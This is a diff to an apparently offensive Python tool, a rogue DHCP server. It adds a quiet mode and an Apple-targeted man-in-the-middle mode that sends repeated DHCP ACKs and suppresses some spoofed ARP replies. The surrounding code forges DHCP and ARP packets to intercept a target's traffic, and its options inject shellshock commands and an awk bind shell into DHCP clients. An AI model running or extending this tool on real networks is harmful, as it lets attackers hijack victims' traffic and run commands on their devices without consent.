@@ -10,11 +10,11 @@ from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
 from netaddr import IPAddress
+from time import sleep
 
 Base = Base()
 Base.check_user()
 Base.check_platform()
-Base.print_banner()
 
 parser = ArgumentParser(description='DHCP Rogue server')
 
@@ -23,6 +23,8 @@ parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client i
 parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default='192.168.0.253')
 parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
 parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
+parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
+parser.add_argument('--apple', action='store_true', help='Apple devices MiTM')
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
@@ -54,6 +56,9 @@ parser.add_argument('--domain', type=str, help='Set domain name for search, defa
 parser.add_argument('--proxy', type=str, help='Set proxy', default=None)
 
 args = parser.parse_args()
+
+if not args.quiet:
+    Base.print_banner()
 
 eth = Ethernet_raw()
 dhcp = DHCP_raw()
@@ -141,19 +146,20 @@ if 255 < args.shellshock_option_code < 0:
     print Base.c_error + "Bad value in DHCP option code! This value should be in the range from 1 to 255"
     exit(1)
 
-print Base.c_info + "Network interface: " + Base.cINFO + current_network_interface + Base.cEND
-if args.target_mac is not None:
-    print Base.c_info + "Target MAC: " + Base.cINFO + args.target_mac + Base.cEND
-if args.target_ip is not None:
-    print Base.c_info + "Target IP: " + Base.cINFO + args.target_ip + Base.cEND
-else:
-    print Base.c_info + "First offer IP: " + Base.cINFO + args.first_offer_ip + Base.cEND
-    print Base.c_info + "Last offer IP: " + Base.cINFO + args.last_offer_ip + Base.cEND
-print Base.c_info + "DHCP server mac address: " + Base.cINFO + dhcp_server_mac_address + Base.cEND
-print Base.c_info + "DHCP server ip address: " + Base.cINFO + dhcp_server_ip_address + Base.cEND
-print Base.c_info + "Router IP address: " + Base.cINFO + router_ip_address + Base.cEND
-print Base.c_info + "Network mask: " + Base.cINFO + network_mask + Base.cEND
-print Base.c_info + "DNS server IP address: " + Base.cINFO + dns_server_ip_address + Base.cEND
+if not args.quiet:
+    print Base.c_info + "Network interface: " + Base.cINFO + current_network_interface + Base.cEND
+    if args.target_mac is not None:
+        print Base.c_info + "Target MAC: " + Base.cINFO + args.target_mac + Base.cEND
+    if args.target_ip is not None:
+        print Base.c_info + "Target IP: " + Base.cINFO + args.target_ip + Base.cEND
+    else:
+        print Base.c_info + "First offer IP: " + Base.cINFO + args.first_offer_ip + Base.cEND
+        print Base.c_info + "Last offer IP: " + Base.cINFO + args.last_offer_ip + Base.cEND
+    print Base.c_info + "DHCP server mac address: " + Base.cINFO + dhcp_server_mac_address + Base.cEND
+    print Base.c_info + "DHCP server ip address: " + Base.cINFO + dhcp_server_ip_address + Base.cEND
+    print Base.c_info + "Router IP address: " + Base.cINFO + router_ip_address + Base.cEND
+    print Base.c_info + "Network mask: " + Base.cINFO + network_mask + Base.cEND
+    print Base.c_info + "DNS server IP address: " + Base.cINFO + dns_server_ip_address + Base.cEND
 
 
 def make_dhcp_offer_packet(transaction_id):
@@ -365,7 +371,12 @@ def dhcp_reply(request):
                     proxy = bytes(args.proxy)
 
                 ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
-                SOCK.send(ack_packet)
+                if not args.apple:
+                    SOCK.send(ack_packet)
+                else:
+                    for _ in range(5):
+                        SOCK.send(ack_packet)
+                        sleep(0.3)
                 print Base.c_info + "Send ack response!"
 
     if request.haslayer(ARP):
@@ -374,11 +385,12 @@ def dhcp_reply(request):
                 if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                     print Base.c_info + "ARP request src MAC: " + request[ARP].hwsrc + " dst IP: " + request[ARP].pdst
                     if request[ARP].pdst != target_ip_address:
-                        sendp(Ether(dst=request[ARP].hwsrc, src=your_mac_address)
-                              / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
-                                    hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2),
-                              iface=current_network_interface, verbose=False)
-                        print Base.c_info + "Send ARP response!"
+                        if not args.apple:
+                            sendp(Ether(dst=request[ARP].hwsrc, src=your_mac_address)
+                                  / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
+                                        hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2),
+                                  iface=current_network_interface, verbose=False)
+                            print Base.c_info + "Send ARP response!"
                     else:
                         arp_req_your_ip = True
                 if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].pdst == router_ip_address:
@@ -386,14 +398,15 @@ def dhcp_reply(request):
 
                 if arp_req_router or arp_req_your_ip:
                     if not possible_output:
-                        print Base.c_warning + "Possible MiTM success!"
-                        print Base.c_warning + "Target MAC: " + Base.cWARNING + target_mac_address + Base.cEND
-                        print Base.c_warning + "Target IP: " + Base.cWARNING + target_ip_address + Base.cEND
-                        possible_output = True
+                        try:
+                            print Base.c_warning + "Possible MiTM! Target: " + Base.cWARNING + \
+                                  target_ip_address + " (" + target_mac_address + ")" + Base.cEND
+                            possible_output = True
+                        except:
+                            pass
                 if arp_req_router and arp_req_your_ip:
-                    print Base.c_success + "MiTM success!"
-                    print Base.c_success + "Target MAC: " + Base.cSUCCESS + target_mac_address + Base.cEND
-                    print Base.c_success + "Target IP: " + Base.cSUCCESS + target_ip_address + Base.cEND
+                    print Base.c_success + "MiTM success! Target: " + Base.cSUCCESS + target_ip_address + \
+                          " (" + target_mac_address + ")" + Base.cEND
                     SOCK.close()
                     exit(0)
     SOCK.close()
